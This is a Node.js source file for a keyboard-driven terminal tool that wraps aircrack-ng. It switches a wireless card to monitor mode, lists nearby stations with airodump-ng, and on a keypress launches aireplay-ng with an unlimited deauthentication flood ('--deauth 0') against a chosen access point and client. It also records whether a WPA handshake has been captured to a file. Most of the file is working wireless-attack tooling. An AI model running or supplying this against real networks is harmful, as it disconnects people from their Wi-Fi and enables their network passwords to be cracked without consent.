'use strict';

const EventEmitter = require('events').EventEmitter;
const logUpdate = require('log-update');
const Table = require('cli-table2');
const keypress = require('keypress');
const os = require('os');
const colors = require('colors');

const airodump = require('./airodump-ng');
const aireplay = require('./aireplay-ng');
const airmon = require('./airmon-ng');
const iwconfig = require('./iwconfig');
const IFace = require('./interface');

const MONITOR = 'monitor';
const ATTACK = 'attack';

const tableOptions = {
  chars: {
    'top': '', 'top-mid': '', 'top-left': '', 'top-right': '', 'bottom': '', 'bottom-mid': '', 'bottom-left': '',
    'bottom-right': '', 'left': '', 'left-mid': '', 'mid': '', 'mid-mid': '', 'right': '', 'right-mid': '', 'middle': ' '
  },
  style: { 'padding-left': 0, 'padding-right': 0 }
};

keypress(process.stdin);

class AirCrackApp extends EventEmitter {

  constructor() {
    super();

    this.status = null; // App status - Monitor Or Attack
    this.handshake = false;
    this.station_index = 0;
    this.stations = [];
    //this.renderTimer = null;

    const self = this;

    //this.render(['Starting airodump-ng...']);

    /**
     * Methods to fireup keypress actions
     */
    this.controls = {
      a: () => self.status === 'monitor' && self.emit('attack'),  // Attack BSSID <---> STATION    airodump.attack();
      up: () => self.emit('choose', 'up'), // Choose BSSID <---> STATION            airodump.moveUpStation();
      down: () => self.emit('choose', 'down'), // Choose BSSID <---> STATION       airodump.moveDownStation();
      b: () => self.status === 'attack' && self.emit('monitor'), // Go back, if attack mode   self.monitor();
      q: () => self.emit('quit'), // Quit application
    };
  }

  init() {
    if (this.status) {
      return;
    }

    //this.renderTimer = setInterval(() => {
    //
    //}, 500);

    process.stdin.setRawMode && process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.on('keypress', (chunk, key) => key && this.controls[key.name] && this.controls[key.name]());

    this.emit(MONITOR);
  }

  /**
   * Render to cli
   * @param data
   * @param info
   */
  render(data, info = []) {

    if (!Array.isArray(data)) {
      return;
    }

    const lines = ['', '\u001b\[J'];
    const table = new Table(tableOptions);

    data.forEach((line) => table.push(line));

    lines.push(table.toString());

    logUpdate([...lines,
      '',
      ...info,
      '\u001b\[1\;1H',
    ].join(os.EOL));
  }

  /**
   * Set available stations from airodump parsed data
   * @param data
   */
  setStations(data) {
    this.stations = Object.keys(data.items).map((mac, index) => {
      const station = Object.assign({}, data.items[mac]);
      station['MAC'] = mac;
      return station;
    });
  }

  /**
   * Get current station object
   * @returns {*}
   */
  getStation() {
    return this.stations[this.station_index];
  }

  /**
   * Prepare Data to render in cli
   * @param data
   * @returns {*}
   */
  prepareMonitorRender(data) {

    const stationMACs = Object.keys(data.items);
    const currIndex = this.station_index;

    if (!stationMACs.length) {
      return [];
    }

    // Prepare for rendering
    const fields = ['#', 'STATION', ...Object.keys(data.items[stationMACs[0]])];
    const lines = stationMACs.map((MAC, index) => [
      (index + 1).toString(),
      MAC,
      ...Object.values(data.items[MAC])
    ].map((item) => index === currIndex ? item.bgRed.white : item));

    return [
      fields,
      ...lines,
      [],
      ['', `current #: ${currIndex + 1}`]
    ];
  }

  /**
   * Increment station index
   */
  incStationIndex() {
    if (this.station_index < this.stations.length) {
      this.station_index++;
    } else {
      this.station_index = 0;
    }
  }

  /**
   * Decrement station index
   */
  decStationIndex() {
    if (this.station_index) {
      this.station_index--;
    } else {
      this.station_index =  this.stations.length ? this.stations.length - 1 : 0;
    }
  }

}

const self = new AirCrackApp();

self.on(MONITOR, () => {

  self.status = MONITOR;

  aireplay.stop();

  self.render([{'Status:': 'Starting airodump-ng...'}]);

  iwconfig.getInterfaces()
    .then((ifaceString) => new IFace(ifaceString))
    .then((iface) => iface.down())
    .then((iface) => iface.setMode(MONITOR))
    .then((iface) => iface.up())
    //.then((iface) => airmon.start(iface))
    //.then((iface) => iwconfig.getInterfaces())
    //.then((ifaceString) => new IFace(ifaceString))
    .then((iface) => airodump.run(iface))
    .then((airodump) => airodump.on('data', (data) => {

      self.setStations(data);

      if (!self.stations.length) {
        return;
      }

      self.render(
        self.prepareMonitorRender(data),
        [
          `\ta = attack\t${String.fromCharCode(8593)}${String.fromCharCode(8595)} = choose\tq = quit`
        ]
      );
    }))
    .catch((error) => console.error(error));
});

self.on(ATTACK, () => {

  const station = self.getStation();

  if (!station) {
    return;
  }

  self.status = ATTACK;

  self.handshake = false;

  self.render([{'Status:': 'Starting aireplay-ng...'}]);

  airodump.run(null,
    '--bssid', station.BSSID,
    '-w', station.ESSID,
    '-c', station.CH
  ).then((airodump) => {

    airodump.on('data', data => {
      if (data.handshake) {
        self.handshake = true;
      }
    });

    // aireplay-ng --deauth 10 -a 64:66:B3:45:C7:F4 -c DC:85:DE:3A:53:BD  mon0
    return aireplay.run(airodump.iface,
      '--deauth', '0',
      '-a', station.BSSID,
      '-c', station.MAC
    );
  }).then((aireplay) => aireplay.on('data', (item) => {

    self.render(
      [
        {'HANDSHAKE': (self.handshake ? '+' : '-')},
        {'ESSID:': station.ESSID},
        {'BSSID:': station.BSSID},
        {'STATION:': station.MAC},
        {'CHANNEL:': station.CH},
        {'STATUS:': item.STATUS},
        {'ACKs:': item.ACKs}
      ],
      [
        `    b = back   q = quit`,
      ]
    );

  }));

});

self.on('render', (data, info) => {
  self.render(data, info);
});

self.on('choose', (dir) => {
  if (dir === 'up') {
    self.decStationIndex();
  } else if(dir === 'down') {
    self.incStationIndex();
  }
});

self.on('quit', () => {
  process.stdin.pause();
  process.exit();
});

module.exports = self;
